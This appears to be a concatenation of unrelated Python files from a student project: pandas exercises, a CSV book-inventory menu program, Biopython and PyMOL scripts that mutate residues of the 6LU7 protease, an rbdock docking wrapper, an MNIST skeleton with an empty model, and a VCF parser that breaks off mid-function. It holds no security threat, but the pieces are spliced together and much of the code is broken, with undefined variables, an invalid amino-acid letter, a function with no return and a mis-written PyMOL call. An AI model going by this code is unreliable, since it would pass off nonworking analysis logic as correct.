# stocks = {'PLW': 387.00, 'CDR': 339.5, 'TEN': 349.5, '11B': 391.0}
# newStock={'BBT': 25.5, 'F51': 19.2}
# # quotations = pd.Series(stocks).append(pd.Series(newStock)) -> Future Warning instead using concat()
# quotations = pd.concat([pd.Series(stocks),pd.Series(newStock)])
# print(quotations)

# problem 9
# stocks = {
#     'PLW': 387.00,
#     'CDR': 339.5,
#     'TEN': 349.5,
#     '11B': 391.0,
#     'BBT': 25.5,
#     'F51': 19.2
# }
# quotations = pd.Series(data=stocks)
# quotations = pd.DataFrame(quotations).reset_index()
# quotations.columns = ['ticker','price']
# print(quotations)


# problem 10
# data_dict = {
#     'company': ['Amazon', 'Microsoft', 'Facebook'],
#     'price': [2375.00, 178.6, 179.2],
#     'ticker': ['AMZN.US', 'MSFT.US', 'FB.US']
# }
# companies = pd.DataFrame(data=data_dict)
# print(companies)

# problem 11
# data_dict = {
#     'company': ['Amazon', 'Microsoft', 'Facebook'],
#     'price': [2375.00, 178.6, 179.2],
#     'ticker': ['AMZN.US', 'MSFT.US', 'FB.US']
# }
#
# companies = pd.DataFrame(data=data_dict)
# companies = companies.set_index('company')
# print(companies)


# problem 12
# date_range = pd.date_range(start='2023-01-01', periods=31)
# print(date_range)

# problem 13


""" deleting >id from gff.3 files"""
# file=open('21-1.gff3.txt')
# a=open('my21.txt','a')
# for i in file:
#     if i.startswith(">"):
#         del(i)
#     else:
#         a.write(i)

"""sorting files have numbers listing inside the file using files"""
# file=open('newsort.txt')
# z=file.readlines()
# # x=z.sort()
# sorted(z)
# with open('sort.txt','w') as f:
#     for i in sorted(z):
#         f.write(i)


"""sorting files have numbers listing inside the file using pandas and write it inside excel file"""
# file=open('newsort.txt')
# z=file.readlines()
# r=[]
# for i in z:
#     r.append(i.split(' '))
#
# x=pd.DataFrame(data=r,columns=['num'+str(i) for i in range(20)])
# y=x.sort_values(by=['num0'])
# print(y)
# y.to_excel('file1.xlsx')


# def fibonacci():
#     num = int(input("How many numbers that generates?:")) #taking user input here with input function
#     # the value of iterator here is 1
#     i = 1
#     if num == 0: #if num == 0 which means that if number will = to 0 then
#         fib = [] #this string will be printed
#     elif num == 1: #if number == 1 so that will start from 1 and so on
#         fib = [1]
#     elif num == 2:
#         fib = [1,1]
#     elif num > 2:
#         fib = [1,1]
#         while i < (num - 1):
#             fib.append(fib[i] + fib[i-1]) #fibonacci logic
#             i += 1
#     return fib
# print(fibonacci()) #printing fibonacci funtion here
# input()

import csv

globalFilename = ''


# function for printing welcome message instead putting it in the main function
def welcomeMessage():
    print(
        '████████████████████████████████████████████████████████████████████████████████████████████████████████████')
    print(
        '█▄─█▀▀▀█─▄█▄─▄▄─█▄─▄███─▄▄▄─█─▄▄─█▄─▀█▀─▄█▄─▄▄─███─▄─▄─█─▄▄─███▄─▀█▀─▄█▄─█─▄███─▄▄▄▄█─▄─▄─█─▄▄─█▄─▄▄▀█▄─▄▄─█')
    print(
        '██─█─█─█─███─▄█▀██─██▀█─███▀█─██─██─█▄█─███─▄█▀█████─███─██─████─█▄█─███▄─▄████▄▄▄▄─███─███─██─██─▄─▄██─▄█▀█')
    print(
        '▀▀▄▄▄▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▀▀▀▄▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▄▄▄▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀')


# function for printing process success instead writing it many times
def printReadingSuccess():
    print('=========================================================================================================')
    print('=====================================data successfully was Read==========================================')
    print('=========================================================================================================')


# read csv files
def readCsvFile(filename):
    with open(filename) as csv_file:
        # creating an object of csv reader
        # with the delimiter as ,
        csv_reader = csv.reader(csv_file, delimiter=',')
        # get number of row
        r = list(csv_reader)
        rowcount = len(r)
        col_count = 0
        # iterating through the whole file
        for _ in r[0]:
            col_count += 1

    return rowcount, col_count


def createCsvFile(filename):
    # writing to csv file
    with open(filename, 'w') as file:
        # creating a csv writer object
        csvwriter = csv.writer(file)
        headers = ['Book ID', 'Title', 'Author', 'Category', 'Quantity', 'Unit price', 'Total price']
        csvwriter.writerow(headers)
    return file


def printNewBookAdded():
    print('========================================================================================================')
    print('=====================================A new book added successfully======================================')
    print('========================================================================================================')


def calcTotalPrice(unit_price_of_book, quantity_of_books):
    total = (unit_price_of_book * quantity_of_books)
    return total


def addNewBook():
    book_id = input('Enter bookID: ')
    title_book = input('Enter Title: ')
    author_name = input('Enter The Author: ')
    category_of_book = input('Enter Category: ')
    quantity_of_books = int(input('Enter Quantity: '))
    unit_price_of_book = float(input('Enter Unit Price: '))
    total_price = calcTotalPrice(unit_price_of_book, quantity_of_books)
    arr = [book_id, title_book, author_name, category_of_book, quantity_of_books, unit_price_of_book, total_price]
    with open(globalFilename, 'a') as file:
        writer = csv.writer(file)
        writer.writerow(arr)
    printNewBookAdded()


def searchById(book_id):
    file = open(globalFilename)
    for i in file:
        i = i.rstrip()
        if i.startswith(book_id):
            return i
        elif i == book_id:
            return i
        elif i.find(book_id) == -1:
            continue
        return i


def printBookDeleted():
    print('========================================================================================================')
    print('================================The book has been deleted successfully==================================')
    print('========================================================================================================')


def deleteNewBook():
    book_id = input('Enter bookID: ')
    if searchById(book_id) is None:
        print('There is no such ID')
    else:
        row_of_book = ''
        row_of_book += searchById(book_id)
        remover = list()
        lines = list()
        with open(globalFilename, 'r') as readFile:
            read = readFile.readlines()
            for i in read:
                if i.startswith(row_of_book):
                    remover.append(i)
                else:
                    lines.append(i.strip('\n'))
        with open(globalFilename, 'w', newline='') as file:
            writer = csv.writer(file)
            for row_lines in lines:
                if row_lines == '':
                    lines.remove(row_lines)
                else:
                    writer.writerow(row_lines.split(','))
        del remover
        del row_of_book


# function for printing process success instead writing it many times
def printNewFileSuccess():
    print(
        '=============================================================================================================')
    print(
        '==========================================File successfully created==========================================')
    print(
        '=============================================================================================================')


# function for printing Menu instead putting it in the main function
def printMenu():
    print('1.  Read Data')
    print('2.  List Data')
    print('3.  Search by Title')
    print('4.  Search by Author')
    print('5.  Add a New Book')
    print('6.  Delete a Book')
    print('7.  Add to Stock of a Book')
    print('8.  Remove from Stock of a Book')
    print('9.  Show Total')
    print('10. Save Data')
    print('11. Exit')


def printListingSuccess():
    print(
        '=============================================================================================================')
    print(
        '==========================================List successfully printed==========================================')
    print(
        '=============================================================================================================')


def listData(f):
    with open(f, "r") as csvfile:
        reader_variable = csv.reader(csvfile, delimiter=",")
        for r in reader_variable:
            print(r)


def searchByTitle(title_name):
    file = open(globalFilename)
    for i in file:
        i = i.rstrip()
        if i.startswith(title_name):
            return i
        elif i.find(title_name) == -1:
            continue
        return i


def removeBlanks():
    with open(globalFilename, newline='') as in_file:
        with open('yy', 'w', newline='') as out_file:
            writer = csv.writer(out_file)
            for rows in csv.reader(in_file):
                if rows:
                    writer.writerow(rows)
    with open('yy', newline='') as in_file:
        with open(globalFilename, 'w', newline='') as out_file:
            writer = csv.writer(out_file)
            for rows in csv.reader(in_file):
                if rows:
                    writer.writerow(rows)


def addStock():
    book_id = input('enter your book ID: ')
    book_id_row = searchById(book_id)
    new_num_quan = int(input('enter your quantity: '))
    with open(globalFilename) as inf:
        reader = csv.reader(inf.readlines())
    with open(globalFilename, 'w') as outf:
        writer = csv.writer(outf)
        arr = book_id_row.split(',')
        for line in reader:
            if line == arr:
                z = int(arr[4]) + new_num_quan
                arr[4] = str(z)
                arr[6] = str(calcTotalPrice(float(arr[5]), int(z)))
                writer.writerow(arr)
            else:
                writer.writerow(line)
        writer.writerows(reader)


def deleteStock():
    book_id = input('enter your book ID: ')
    book_id_row = searchById(book_id)
    new_num_quan = int(input('enter your quantity: '))
    with open(globalFilename) as inf:
        reader = csv.reader(inf.readlines())
    with open(globalFilename, 'w') as outf:
        writer = csv.writer(outf)
        arr = book_id_row.split(',')
        for line in reader:
            if line == arr:
                z = int(arr[4]) - new_num_quan
                if z == 0 or z < 0:
                    print("There is no books in stock")
                    arr[4] = '0'
                    arr[6] = '0.0'
                    writer.writerow(arr)
                else:
                    arr[4] = str(z)
                    arr[6] = str(calcTotalPrice(float(arr[5]), int(z)))
                    writer.writerow(arr)
            else:
                writer.writerow(line)
        writer.writerows(reader)


def searchByAuthor(author_name):
    file = open(globalFilename)
    for i in file:
        i = i.rstrip()
        if i.startswith(author_name):
            return i
        elif i == author_name:
            return i
        elif i.find(author_name) == -1:
            continue
        return i


def errorHandling():
    print('\n', '\n', 'The file name is none try again', '\n', '\n')


def linePrinter():
    print('\n', '\n')


def updateStockSuccess():
    print(
        '=============================================================================================================')
    print(
        '==========================================Stock updated successfully=========================================')
    print(
        '=============================================================================================================')


def showTotal():
    with open(globalFilename) as file:
        reader = csv.DictReader(file)
        total = 0
        for i in reader:
            total += float(i['Total price'])
    print(f'total: {total}')


welcomeMessage()
while True:
    linePrinter()
    printMenu()
    ans = input('enter your choose: ')
    if ans == '1':
        globalFilename = input("Enter your file name: ")
        if globalFilename != '':
            row, col = readCsvFile(globalFilename)
            printReadingSuccess()
            print(f'{col} Col X {row} Row ')
            removeBlanks()
            linePrinter()
        else:
            errorHandling()
    elif ans == '2':
        if globalFilename != '':
            linePrinter()
            printListingSuccess()
            linePrinter()
            listData(globalFilename)
            linePrinter()
        else:
            errorHandling()
    elif ans == '3':
        if globalFilename != '':
            title = input("Enter you search title: ")
            linePrinter()
            print(searchByTitle(title))
            linePrinter()
        else:
            errorHandling()
    elif ans == '4':
        if globalFilename != '':
            author = input("Enter you search title: ")
            linePrinter()
            print(searchByAuthor(author))
            linePrinter()
        else:
            errorHandling()
    elif ans == '5':
        if globalFilename != '':
            linePrinter()
            addNewBook()
            linePrinter()
            printNewBookAdded()
            linePrinter()
            removeBlanks()
        else:
            errorHandling()
    elif ans == '6':
        if globalFilename != '':
            deleteNewBook()
            printBookDeleted()
            removeBlanks()
        else:
            errorHandling()
    elif ans == '7':
        if globalFilename != '':
            linePrinter()
            addStock()
            linePrinter()
            updateStockSuccess()
            removeBlanks()
        else:
            errorHandling()
    elif ans == '8':
        if globalFilename != '':
            linePrinter()
            deleteStock()
            linePrinter()
            updateStockSuccess()
            removeBlanks()
        else:
            errorHandling()
    elif ans == '9':
        if globalFilename != '':
            linePrinter()
            showTotal()
            linePrinter()
        else:
            errorHandling()
    elif ans == '10':
        if globalFilename != '':
            linePrinter()
            print('Data is saved successfully')
            linePrinter()
        else:
            errorHandling()
    elif ans == '11':
        linePrinter()
        print('Good bye')
        linePrinter()
        break
    else:
        print('Wrong entry')
from Bio.PDB import *
from Bio.Seq import Seq
from Bio.SeqRecord import SeqRecord




# Load the structure of the protein
parser = PDBParser()
structure = parser.get_structure("PROT", "6lu7.pdb")

# Get the active site residues of the protein
chain = structure[0]['A']
active_site = [res for res in chain if res.id[1] in active_site_residue_numbers]

# Get the sequence of the protein
seq = ""
for res in chain:
    seq += res.get_resname()

# Create a mutable sequence
seq = Seq(seq, generic_protein)
seq = seq.tomutable()

# Mutate the active site residues to all possible amino acids
amino_acids = ["A","C","D","E","F","G","H","I","K","L","M","N","P","Q","R","S","T","V","W","Y","*"]
for i in range(10):
    for aa in amino_acids:
        seq[active_site[i]] = aa
        record = SeqRecord(seq)
        print(f"Active Site Residue {i+1} mutated to {aa}  => {record.seq}")
#!/usr/bin/env python
# coding: utf-8

import os
from multiprocessing import Pool
from subprocess import run
from glob import glob
import shlex
import re
from functools import partial
import sys

RDKIT = False
try:
    from rdkit.Chem import PandasTools as pt

    RDKIT = True
except:
    pass


# In[52]:

class RXDock():

    @classmethod
    def rbdock(cls, ligand_file, receptor_prm,
               output_suffix='_out', dock_prm='dock.prm',
               logfile=True,
               **kwargs):
        """
        Parameters
        ----------
        ligand_file : str
            Path to SDF file containing ligands to dock
        receptor_prm : str
            Path to receptor Parameters
        output_suffix : str, optional
            Resulting sdf files will be append with this suffix.
            The default is '_out'.
        dock_prm : str, optional
            Name of docking protocol parameter file.
            The default is 'dock.prm'.
        **kwargs : arg:value
            all commandline flags for rbdock can be passed as
            keyword arguments. A simple flag is passed with an
            empty string as value, e.g. H='' (will append the -H flag)
        Returns
        -------
        str
            Absolute path to the sdf file with docked ligands.
        """

        if logfile:
            stdout = open(ligand_file.replace('.sd', '.log'), 'wb')
        else:
            stdout = sys.stdout

        run(
            shlex.split(
                'rbdock -i %s -o %s -r %s -p %s %s' %
                (
                    ligand_file,
                    ligand_file.replace('.sd', '') + output_suffix,
                    receptor_prm,
                    dock_prm,
                    ' '.join(['-%s %s' % (k, v) for k, v in kwargs.items()])
                )
            ),
            stdout=stdout,
            stderr=stdout
        )

        return os.path.abspath(
            os.path.join(
                os.path.dirname(ligand_file),
                os.path.splitext(os.path.basename(ligand_file))[0]) + \
            output_suffix + '.sd')

    # In[53]:
    @classmethod
    def sdsplit(cls, ligand_file, dir_prefix='tmp',
                split_prefix='tmp_',
                n=30):
        """
        Wraps the sdsplit tool
        Parameters
        ----------
        ligand_file : str
            path to SDF file to split.
        dir_prefix : str, optional
            split SDF files will be put into ./{dir_prefix}.
            The default is 'tmp'.
        split_prefix : str, optional
            basename for splitted SDF files.
            The default is 'tmp_'.
        n : int, optional
            Number of ligands in split files.
            The default is 30.
        Returns
        -------
        splits : list[str]
            Paths to splitted SDF files (./{dir_prefix}/{split_prefix}*.sd)
        """

        if RDKIT:
            df = pt.LoadSDF(ligand_file, removeHs=False)
            pt.WriteSDF(df, ligand_file, idName='RowID',
                        properties=df.columns)

        if not os.path.exists(dir_prefix):
            os.mkdir(dir_prefix)

        run(
            [
                'sdsplit',
                '-%s' % str(n),
                '-o %s/%s' % (dir_prefix, split_prefix),
                '%s' % ligand_file
            ]
        )

        temp = glob('%s/%s*.sd' % (dir_prefix, split_prefix))

        r = re.compile('\d+.sd')
        splits = sorted(temp, key=lambda x: int(r.findall(x)[0].replace('.sd', '')))

        return splits

    @classmethod
    def _multidock(cls, ligands, receptor_prm, output_suffix='_out',
                   dock_prm='dock.prm', n_jobs=2, **kwargs):

        p = Pool(n_jobs)

        _map_func = partial(cls.rbdock, receptor_prm=receptor_prm,
                            output_suffix=output_suffix, dock_prm=dock_prm,
                            **kwargs)

        out = p.map(_map_func, ligands)

        return out

    @classmethod
    def splitdock(cls, ligands, receptor_prm,
                  tmpdir_prefix='tmp',
                  split_prefix='tmp_',
                  n_splits=30,
                  output_suffix='_out',
                  dock_prm='dock.prm',
                  logfile=True,
                  **kwargs):

        splitted = cls.sdsplit(ligands,
                               dir_prefix=tmpdir_prefix,
                               split_prefix=split_prefix,
                               n=n_splits)

        res = cls._multidock(splitted,
                             receptor_prm=receptor_prm,
                             output_suffix=output_suffix,
                             dock_prm=dock_prm,
                             n_jobs=kwargs.pop('n_jobs', 2),
                             logfile=logfile,
                             **kwargs)

        return res








# -*- coding: utf-8 -*-
"""Copy of mnist_convnet

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1rckKJCkSC72UEyZ0WbQPBniNUTM0X-8X

# Simple MNIST convnet

**Author:** [fchollet](https://twitter.com/fchollet)<br>
**Date created:** 2015/06/19<br>
**Last modified:** 2020/04/21<br>
**Description:** A simple convnet that achieves ~99% test accuracy on MNIST.

## Setup
"""

import numpy as np
from tensorflow import keras
from keras import layers

"""## Prepare the data"""

# Model / data parameters
num_classes = 10
input_shape = (28, 28, 1)

# Load the data and split it between train and test sets
(x_train, y_train), (x_test, y_test) = keras.datasets.mnist.load_data()

# Scale images to the [0, 1] range
# x_train =
# x_test =
# Make sure images have shape (28, 28, 1)
x_train = np.expand_dims(x_train, -1)
x_test = np.expand_dims(x_test, -1)
print("x_train shape:", x_train.shape)
print(x_train.shape[0], "train samples")
print(x_test.shape[0], "test samples")

# convert class vectors to binary class matrices
y_train = keras.utils.to_categorical(y_train, num_classes)
y_test = keras.utils.to_categorical(y_test, num_classes)

"""## Build the model"""

model = keras.Sequential(
    [

    ]
)

model.summary()

"""## Train the model"""

batch_size = 128
epochs = 15

model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

model.fit(x_train, y_train, batch_size=batch_size, epochs=epochs, validation_split=0.1)

"""## Evaluate the trained model"""

score = model.evaluate(x_test, y_test, verbose=0)
print("Test loss:", score[0])
print("Test accuracy:", score[1])


from Bio import SeqIO
from Bio.Seq import Seq

class Sequence:

    def __init__(self,filename):
        self.filename = filename


    def readFastaFile(file_name):
        # Set up an empty list
        sequences = []
        for seq_record in SeqIO.parse(file_name, "fasta"):
            # Add this record to our list
            sequences.append(str(seq_record.seq))
            # print sequence
            print(seq_record.seq)
            # print sequence identifier
            print(seq_record.id)
            # print length of the sequence
            print(len(seq_record))


# , 'G', 'H', 'I', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'Y','*'
# arr=['A', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'Y','*']
# amino_acids = [11,12,13, 14,15,16,17,18,19,20,21,22,23,24,25, 26 ,25,27,28,29,30]
# print(len(amino_acids))
# print(len(arr))
# active_sites=[0,1,2,3,4,5,6,7,8,9]
# initialize lists
# create empty list to store the
# combinations




# import itertools
# import csv
# amino_acids = ['A', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'Y']
# active_sites=[41, 46, 141, 142, 145, 166, 168, 189, 190, 191]
# list_1 = amino_acids
# list_2 = active_sites
# unique_combinations = []
# permut = itertools.permutations(list_1, len(list_2))
# for comb in permut:
#     print(list(zip(comb, list_2)))
# with open('example.csv', 'w', encoding='utf-8') as file:
#     writer = csv.writer(file, delimiter=" ", skipinitialspace=True)
#     for comb in permut:
#         writer.writerow(list(zip(comb, list_2)))
# file.close()


# # Getting all permutations of list_1
# with length of list_2

# zip() is called to pair each permutation
# and shorter list element into combination

# # printing unique_combination list
# # print(unique_combinations)
# print("===============================================")


import testing2

dock=testing2.doking('6lu7.pdb')

seq1='SGFRKMAFPSGKVEGCMVQVTCGTTTLNGLWLDDVVYCPRHVICTSEDMLNPNYEDLLIRKSNHNFLVQAGNVQLRVIGHSMQNCVLKLKVDTANPKTPKYKFVRIQPGQTFSVLACYNGSPSGVYQCAMRPNFTIKGSFLNGSCGSVGFNIDYDCVSFCYMHHMELPTGVHAGTDLEGNFYGPFVDRQTAQAAGTDTTITVNVLAWLYAAVINGDRWFLNRFTTTLNDFNLVAMKYNYEPLTQDHVDILGPLSAQTGIAVLDMCASLKELLQNGMNGRTILGSALLEDEFTPFDVVRQCSGVTFQAVL'
# seq=dock.getSequance()
# y=seq['A']
z=[('A', 41), ('C', 46), ('D', 141), ('E', 142), ('F', 145), ('I', 166), ('Y', 168), ('Q', 189), ('S', 190), ('K', 191)]

k=[]
for i in seq1:
    k.append(i)
newseq = ''
for i in range(len(z)):
    k[z[i][1]-1]=z[i][0]
for i in k:
    newseq += i
# print(newseq)
# seq=newseq

seq = "MKTVRQERLKSIVRILERSKEPVSGAEMFERVYTKDIAYVGSLRGVISMVPSNYDANKVGTCLVALGKEGFPVJTEDERSITYGITDQVYWQATGKEDVVIHFVDQDLCLELIKEGVTNRAKLKPDAVYQFYLRVLNYVLDDELLKIMNLNEKDLLAKSRWYNQTPNRAKRVITTF"




# import pymolPy3
import pymol

# start PyMOL and load the PDB file
pymol.finish_launching()
pymol.cmd.load('example.pdb')

# select the chain and residue number you want to mutate
chain_id = 'A'
residue_num = 10

# select the new residue you want to replace the old one with
new_residue_name = 'LEU'

# create a new residue with the specified name
pymol.cmd.fragment(new_residue_name)

# select the old residue and replace it with the new one
pymol.cmd.select('old_residue', f'chain {chain_id} and resi {residue_num}')
pymol.cmd.remove('old_residue')
pymol.cmd.select('new_residue', 'fragment')
pymol.cmd.create('new_residue', 'new_residue')
pymol.cmd.alter(f'new_residue and chain {chain_id} and resi {residue_num}', 'resn = @new_residue_name')

# save the modified PDB file
pymol.cmd.save('modified.pdb')

# quit PyMOL
pymol.cmd.quit()




from Bio.PDB.PDBParser import PDBParser
from Bio.PDB.Polypeptide import *

class doking:
    def __init__(self,pdb_file):
        parser = PDBParser()
        self.structure = parser.get_structure('6lu7', pdb_file)
    # def getResidues(self):

    def getSequance(self):
        seq = {}
        ppb = PPBuilder()

        for model in self.structure:
            polypeptides = ppb.build_peptides(model)
            assert len(model) == len(polypeptides)
            for chain, pep in zip(model, polypeptides):
                seq[chain.id] = pep.get_sequence()
        return seq

    def getResidues(self):
        x= dict()
        model = self.structure[0]
        # loop through all residues in the model
        for chain in model:
            for residue in chain:
                residue_id = residue.get_id()
                residue_name = residue.get_resname()
                x[residue_id] = residue_name
        return x
    def getatoms(self):
        x=dict()
        model=self.structure[0]
        # Get the atom information from the residues
        for chain in model:
            for residue in chain:
                for atom in residue:
                    x[atom.get_name()]=atom.get_coord()
        return x

    def getActiveSites(self):
        arr=[41, 46, 141, 142, 145, 166, 168, 189, 190, 191]
        ActiveSites=[]
        seqs_dic = self.getSequance()
        seq=seqs_dic['A']
        for i in range(len(seq)):
            if i in arr:
                ActiveSites.append(seq[i - 1])
        return ActiveSites
from Bio.Seq import Seq
from Bio.SeqUtils import GC


def GC_content(sequence):

    seque = Seq(sequence)
    content = GC(seque)
    return content


def transcribion(sequence):

    coding_dna = Seq(sequence)
    messenger_rna = coding_dna.transcribe()
    return messenger_rna


def translation_from_dna(sequence):

    seque = Seq(sequence)
    protein = seque.translate()
    return protein


def translation_from_mrna(messenger_rna):

    seque = Seq(messenger_rna)
    protein = seque.translate()
    return protein


def back_transcription(messenger_rna):

    seque = Seq(messenger_rna)
    coding_dna = seque.back_transcribe()
    return coding_dna

# TODO


def protein_to_dna(protein):

    table = {
        'ATA': 'I', 'ATC': 'I', 'ATT': 'I', 'ATG': 'M',
        'ACA': 'T', 'ACC': 'T', 'ACG': 'T', 'ACT': 'T',
        'AAC': 'N', 'AAT': 'N', 'AAA': 'K', 'AAG': 'K',
        'AGC': 'S', 'AGT': 'S', 'AGA': 'R', 'AGG': 'R',
        'CTA': 'L', 'CTC': 'L', 'CTG': 'L', 'CTT': 'L',
        'CCA': 'P', 'CCC': 'P', 'CCG': 'P', 'CCT': 'P',
        'CAC': 'H', 'CAT': 'H', 'CAA': 'Q', 'CAG': 'Q',
        'CGA': 'R', 'CGC': 'R', 'CGG': 'R', 'CGT': 'R',
        'GTA': 'V', 'GTC': 'V', 'GTG': 'V', 'GTT': 'V',
        'GCA': 'A', 'GCC': 'A', 'GCG': 'A', 'GCT': 'A',
        'GAC': 'D', 'GAT': 'D', 'GAA': 'E', 'GAG': 'E',
        'GGA': 'G', 'GGC': 'G', 'GGG': 'G', 'GGT': 'G',
        'TCA': 'S', 'TCC': 'S', 'TCG': 'S', 'TCT': 'S',
        'TTC': 'F', 'TTT': 'F', 'TTA': 'L', 'TTG': 'L',
        'TAC': 'Y', 'TAT': 'Y', 'TAA': '_', 'TAG': '_',
        'TGC': 'C', 'TGT': 'C', 'TGA': '_', 'TGG': 'W',
    }
    # protein =""
    # if len(seq)%3 == 0:
    #     for i in range(0, len(seq), 3):
    #         codon = seq[i:i + 3]
    #         protein+= table[codon]
    # return protein


# print(protein_to_dna('MAIVMGRKGAR'))
table = {
    'ATA': 'I', 'ATC': 'I', 'ATT': 'I', 'ATG': 'M',
    'ACA': 'T', 'ACC': 'T', 'ACG': 'T', 'ACT': 'T',
    'AAC': 'N', 'AAT': 'N', 'AAA': 'K', 'AAG': 'K',
    'AGC': 'S', 'AGT': 'S', 'AGA': 'R', 'AGG': 'R',
    'CTA': 'L', 'CTC': 'L', 'CTG': 'L', 'CTT': 'L',
    'CCA': 'P', 'CCC': 'P', 'CCG': 'P', 'CCT': 'P',
    'CAC': 'H', 'CAT': 'H', 'CAA': 'Q', 'CAG': 'Q',
    'CGA': 'R', 'CGC': 'R', 'CGG': 'R', 'CGT': 'R',
    'GTA': 'V', 'GTC': 'V', 'GTG': 'V', 'GTT': 'V',
    'GCA': 'A', 'GCC': 'A', 'GCG': 'A', 'GCT': 'A',
    'GAC': 'D', 'GAT': 'D', 'GAA': 'E', 'GAG': 'E',
    'GGA': 'G', 'GGC': 'G', 'GGG': 'G', 'GGT': 'G',
    'TCA': 'S', 'TCC': 'S', 'TCG': 'S', 'TCT': 'S',
    'TTC': 'F', 'TTT': 'F', 'TTA': 'L', 'TTG': 'L',
    'TAC': 'Y', 'TAT': 'Y', 'TAA': '_', 'TAG': '_',
    'TGC': 'C', 'TGT': 'C', 'TGA': '_', 'TGG': 'W',
}

# print(table.values())

# dict_keys(['ATA', 'ATC', 'ATT', 'ATG', 'ACA', 'ACC', 'ACG', 'ACT', 'AAC', 'AAT', 'AAA', 'AAG', 'AGC', 'AGT', 'AGA', 'AGG', 'CTA', 'CTC', 'CTG', 'CTT', 'CCA', 'CCC', 'CCG', 'CCT', 'CAC', 'CAT', 'CAA', 'CAG', 'CGA', 'CGC', 'CGG', 'CGT', 'GTA', 'GTC', 'GTG', 'GTT', 'GCA', 'GCC', 'GCG', 'GCT', 'GAC', 'GAT', 'GAA', 'GAG', 'GGA', 'GGC', 'GGG', 'GGT', 'TCA', 'TCC', 'TCG', 'TCT', 'TTC', 'TTT', 'TTA', 'TTG', 'TAC', 'TAT', 'TAA', 'TAG', 'TGC', 'TGT', 'TGA', 'TGG'])

# new_table = {}

# for i in range(len(table)):

#     new_table.keys += table.values[i]
# keys = list(table)
# print(keys[3])
import gzip
import matplotlib.pyplot as plt
import pandas as pd
from collections import Counter
from matplotlib import pyplot as plt
from pandas.core.dtypes.generic import ABCSeries

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe 
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'rt')
    else:
        f = open(filename, 'r')
    header = []
    data = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            continue
        else:
            data.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data = [line.split('\t') for line in data]
    df = pd.DataFrame(data, columns=header)
    return df


"""
    this function return the SNPs values for a sample
        input:
            :param Data - pandas dataframe : vcf data
            :param sample_name - string : sample name
        output:
            :return sample_values - list : genotypes
"""


def return_sample_values(Data, sample_name):
    return Data[sample_name].values


"""
    this function return the SNPs values for a specific chromosome
        input:
            :param Data - pandas dataframe : vcf data
            :param Chr - string : chromosome name
        output:
            :return sample_values - list : subset of the vcf data
"""


def return_Chr(Data, Chr, Matrix=False):
    if Matrix:
        # return the matrix of values without the header or information
        subsetData = Data.loc[Data['#CHROM'] == Chr]
        return subsetData.iloc[:, 9::]
    else:
        return Data.loc[Data['#CHROM'] == Chr]


""" 
    this function return the SNPs values for specific SNP[ID]
        input:
            :param Data - pandas dataframe : vcf Data
            :param SNPid - string : SNP[ID]
        output:
            :return snpvalues - list : return all value for specific SNPid 
"""


def getSNPvalues(Data, SNPid):
    snpvalues = Data.loc[Data['ID'] == SNPid,]
    # remove information columns
    snpvalues = snpvalues.iloc[:, 9::]
    # as list
    snpvalues = snpvalues.values.tolist()
    return snpvalues


""" 
    this function return the SNPs values for specific Alternative
        input:
            :param Data - pandas dataframe : vcf Data
            :param SNPid - string : SNP ID
        output:
            :return SNPAlt - str : String of the Alternative of SNP ID
"""


def getSNPAlt(Data, SNPid):
    SNPAlt = Data.loc[Data['ID'] == SNPid, ['ALT']]
    return SNPAlt['ALT'].iloc[0]


""" 
    this function return the SNPs values for specific Reference
        input:
            :param Data - pandas dataframe : vcf Data
            :param SNPid - string : SNP ID
        output:
            :return SNPRef - str : String of the Reference of SNP ID
"""


def getSNPRef(Data, SNPid):
    SNPRef = Data.loc[Data['ID'] == SNPid, ['REF']]
    return SNPRef['REF'].iloc[0]


""" 
    this function return the SNPs values count for all alleles
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return all_alleles_counter - list : count of all alleles string
"""


def getAllSNPAllelesCount(Data):
    SNPs = Data['ID']
    # define list to have all SNPs values
    all_string_alleles = []
    # looping on all SNPs and get the values and convert it to string for REF or ALT
    for i in SNPs:
        all_string_alleles += getAlleles(Data, i)
    # count alleles
    all_alleles_counter = Counter(all_string_alleles)
    # return count alleles
    return all_alleles_counter


""" 
    this function return the CHROM names with its alleles SNPs count as a dict()
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return CHROM names with its alleles SNPs count - dict() : dictionary with all alleles count 
   """


def getDictInDataframe(data_frame):
    sn_ps = data_frame[['#CHROM', 'ID']]

    df = sn_ps.set_index('#CHROM').to_dict()['ID']
    for i in df:
        snp_id = df[i]
        df[i] = getSNPAllelesCount(data_frame, snp_id)
    return df


""" 
    this function return the CHROM names with its alleles a dict()
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return CHROM names with its alleles  - dict() : dictionary with all alleles  
   """


def getAllelesInDict(data_frame):
    sn_ps = data_frame[['#CHROM', 'ID']]
    df = sn_ps.set_index('#CHROM').to_dict()['ID']
    for i in df:
        snp_id = df[i]
        df[i] = getAlleles(data_frame, snp_id)
    return df


""" 
    this function return the CHROM names with two multi values alleles and alleles counts
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return CHROM names with two multi values alleles and alleles counts  - dict() : dictionary with two multi values alleles and alleles counts  
   """


def makeDictForAll(data_frame):
    sn_ps = data_frame[['#CHROM', 'ID']]
    df = sn_ps.set_index('#CHROM').to_dict()['ID']
    for i in df:
        snp_id = df[i]
